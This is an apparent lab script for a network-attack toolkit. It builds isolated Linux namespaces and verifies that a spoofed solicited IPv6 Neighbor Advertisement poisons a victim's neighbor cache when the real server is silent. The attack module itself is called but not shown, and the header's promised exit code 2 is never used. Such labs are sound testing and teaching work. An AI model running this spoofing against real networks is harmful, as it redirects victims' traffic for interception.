#!/usr/bin/env bash
# Isolated solicited Neighbor Advertisement spoofing lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, on one bridge (sw):
#
#   victim:   the requester. It pings the server, which makes it send a Neighbor Solicitation for the
#             server's address and wait for a Neighbor Advertisement.
#   server:   the host whose address is requested (SERVER_ADDR). Its interface is taken down during the
#             attack, so the only reply the victim can get comes from the attacker.
#   attacker: answers the victim's solicitation with a solicited NA from MACabre's module (S set, O clear).
#
# Phases:
#   control: the server is up and answers. The victim's cache entry for SERVER_ADDR must hold the server's MAC.
#   attack:  the server is down. The attacker answers the first solicitation for SERVER_ADDR. The victim's
#            entry must now hold the attacker's MAC, in state REACHABLE.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/neighbor_advertisement_spoofing_lab.sh
#
# Exit 0 when control holds the server's MAC and attack holds the attacker's MAC.
# Exit 1 when either does not. Exit 2 when the setup failed.
#
# Requirements: iproute2 (ip), IPv6 in the kernel, and the project virtualenv (.venv) with scapy.
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip ping awk; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
VICTIM_MAC="02:00:00:00:00:10"
SERVER_MAC="02:00:00:00:00:20"
ATTACKER_MAC="02:00:00:00:00:30"
VICTIM_ADDR="2001:db8:1::10"
SERVER_ADDR="2001:db8:1::20"
ATTACKER_PID=""

stop_attacker() {
    if [[ -n "$ATTACKER_PID" ]] && kill -0 "$ATTACKER_PID" 2>/dev/null; then
        kill -TERM "$ATTACKER_PID" 2>/dev/null || true
        wait "$ATTACKER_PID" 2>/dev/null || true
    fi
    ATTACKER_PID=""
}

stop_lab() {
    stop_attacker
    for ns in attacker victim server sw; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

mk_veth() {
    ip link add "$1" type veth peer name "$2"
    ip link set "$1" netns "$3"
    ip link set "$2" netns "$4"
}

build_topology() {
    stop_lab
    for ns in sw victim server attacker; do
        ip netns add "$ns"
        ip netns exec "$ns" ip link set lo up
    done
    mk_veth p-v v0 sw victim
    mk_veth p-s s0 sw server
    mk_veth p-a a1 sw attacker
    ip netns exec sw ip link add br0 type bridge stp_state 0
    for p in p-v p-s p-a; do
        ip netns exec sw ip link set "$p" master br0
        ip netns exec sw ip link set "$p" up
    done
    ip netns exec sw ip link set br0 up
    ip netns exec victim ip link set v0 address "$VICTIM_MAC"
    ip netns exec server ip link set s0 address "$SERVER_MAC"
    ip netns exec attacker ip link set a1 address "$ATTACKER_MAC"
    ip netns exec victim ip link set v0 up
    ip netns exec server ip link set s0 up
    ip netns exec attacker ip link set a1 up
    ip netns exec victim ip -6 addr add "$VICTIM_ADDR/64" dev v0 nodad
    ip netns exec server ip -6 addr add "$SERVER_ADDR/64" dev s0 nodad
}

cache_lladdr() {
    ip netns exec victim ip -6 neigh show dev v0 "$SERVER_ADDR" | awk '{for (i=1;i<=NF;i++) if ($i=="lladdr") print $(i+1)}'
}

cache_state() {
    ip netns exec victim ip -6 neigh show dev v0 "$SERVER_ADDR" | awk '{print $NF}'
}

echo "=== control ==="
build_topology
ip netns exec victim ping -6 -c 2 -W 1 "$SERVER_ADDR" >/dev/null 2>&1 || true
sleep 1
control_lladdr=$(cache_lladdr)
echo "victim's cache for $SERVER_ADDR: lladdr=${control_lladdr:-none} state=$(cache_state)"

echo "=== attack ==="
build_topology
ip netns exec server ip link set s0 down
ip netns exec attacker "$PY" -m macabre.attacks.neighbor_advertisement_spoofing a1 \
    --source-mac "$ATTACKER_MAC" --target "$SERVER_ADDR" --answers 1 --timeout 8 &
ATTACKER_PID=$!
sleep 1
ip netns exec victim ping -6 -c 2 -W 1 "$SERVER_ADDR" >/dev/null 2>&1 || true
wait "$ATTACKER_PID" 2>/dev/null || true
ATTACKER_PID=""
sleep 1
attack_lladdr=$(cache_lladdr)
echo "victim's cache for $SERVER_ADDR: lladdr=${attack_lladdr:-none} state=$(cache_state)"

echo
control_ok=0; attack_ok=0
if [[ "$control_lladdr" == "$SERVER_MAC" ]]; then control_ok=1; fi
if [[ "$attack_lladdr" == "$ATTACKER_MAC" && "$(cache_state)" == REACHABLE ]]; then attack_ok=1; fi
echo "control: the cache holds the server's MAC ($SERVER_MAC): $([[ $control_ok == 1 ]] && echo yes || echo no)"
echo "attack:  the cache holds the attacker's MAC ($ATTACKER_MAC) in REACHABLE: $([[ $attack_ok == 1 ]] && echo yes || echo no)"

if (( control_ok && attack_ok )); then
    echo "PASS: a solicited Neighbor Advertisement from the attacker sets the victim's entry when the server is silent."
    exit 0
fi
echo "FAIL: the victim's cache did not change as expected."
exit 1
